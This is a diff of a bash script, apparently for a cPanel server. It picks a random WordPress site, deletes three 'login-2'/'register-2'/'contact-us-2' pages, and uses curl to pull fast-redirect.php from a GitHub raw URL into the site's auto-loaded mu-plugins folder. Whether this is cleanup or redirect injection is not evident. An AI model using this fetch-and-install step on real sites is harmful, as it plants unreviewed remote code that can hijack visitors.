@@ -3,7 +3,6 @@ GITHUB_RAW="https://raw.githubusercontent.com/ufavision/remove3page-add-fast-red
 LOG_DIR="/root/redirect-logs"
 mkdir -p "$LOG_DIR"
 
-# ===== ดึงรายชื่อเว็บทั้งหมดที่เป็น WordPress =====
 echo "======================================"
 echo "🔍 กำลังค้นหาเว็บ WordPress ทั้งหมด..."
 echo "======================================"
@@ -23,7 +22,6 @@ if [ "$TOTAL" -eq 0 ]; then
   exit 1
 fi
 
-# ===== สุ่มเว็บ =====
 RANDOM_INDEX=$((RANDOM % TOTAL))
 DOMAIN="${WP_DOMAINS[$RANDOM_INDEX]}"
 
@@ -31,7 +29,6 @@ echo "🎲 สุ่มได้เว็บ: $DOMAIN"
 echo "📋 จากทั้งหมด: $TOTAL เว็บ"
 echo "======================================"
 
-# ===== ดึง path =====
 LINE=$(grep "^$DOMAIN:" /etc/userdatadomains | head -1)
 USERNAME=$(echo "$LINE" | awk -F'==' '{print $1}' | awk -F': ' '{print $2}' | tr -d ' ')
 WP_PATH=$(echo "$LINE" | awk -F'==' '{print $5}')
@@ -44,7 +41,6 @@ fi
 echo "✅ username : $USERNAME"
 echo "✅ path     : $WP_PATH"
 
-# ===== ลบ 3 Pages =====
 echo ""
 echo "🗑️ กำลังลบ Pages..."
 DELETED=()
@@ -62,7 +58,6 @@ for SLUG in "login-2" "register-2" "contact-us-2"; do
   fi
 done
 
-# ===== วาง fast-redirect.php =====
 MU_DIR="$WP_PATH/wp-content/mu-plugins"
 mkdir -p "$MU_DIR"
 
@@ -73,12 +68,15 @@ fi
 
 curl -s "$GITHUB_RAW/fast-redirect.php" -o "$MU_DIR/fast-redirect.php"
 
-# ===== บันทึก Log =====
+chown "$USERNAME":"$USERNAME" "$MU_DIR"
+chown "$USERNAME":"$USERNAME" "$MU_DIR/fast-redirect.php"
+chmod 755 "$MU_DIR"
+chmod 644 "$MU_DIR/fast-redirect.php"
+
 LOG_FILE="$LOG_DIR/run-$(date '+%Y%m%d').log"
 TIMESTAMP=$(date '+%Y-%m-%d %H:%M:%S')
 echo "[$TIMESTAMP] run-single | $DOMAIN | $WP_PATH | ลบ: ${DELETED[*]} | ไม่พบ: ${NOT_FOUND[*]}" >> "$LOG_FILE"
 
-# ===== แสดงผลสรุป =====
 echo ""
 echo "======================================"
 echo "📊 สรุปผลการทำงาน"
@@ -94,7 +92,6 @@ if [ ${#NOT_FOUND[@]} -gt 0 ]; then
 fi
 echo "✅ วางไฟล์         : fast-redirect.php"
 
-# ===== แสดงรายชื่อเว็บที่แก้ไขล่าสุดจาก Log =====
 echo ""
 echo "======================================"
 echo "📝 รายชื่อเว็บที่แก้ไขล่าสุด (วันนี้)"
